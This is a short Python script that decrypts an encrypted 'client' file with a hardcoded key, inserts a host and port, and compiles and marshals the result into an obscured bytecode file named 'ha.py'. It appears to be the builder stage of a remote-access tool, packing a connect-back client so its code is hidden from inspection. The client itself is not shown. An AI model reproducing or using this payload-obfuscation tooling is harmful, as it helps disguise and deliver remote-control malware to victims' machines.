from marshal import loads, dumps
from cryptography.fernet import Fernet

key = "8bH85AgvjWkKw4IlhI8Va3qprLXec2dipzS_9loLOp8="
cipher_suite = Fernet(key)
enc_client = open('files\\client.enc', 'r').read()
client = cipher_suite.decrypt(enc_client).format(('"' + "127.0.0.1" + '"'), 3344)
print(client)
compiled = compile(client, 'client', 'exec')
dump_cli = dumps(compiled)
print(dump_cli)
open('ha.py', 'w').write(dump_cli)
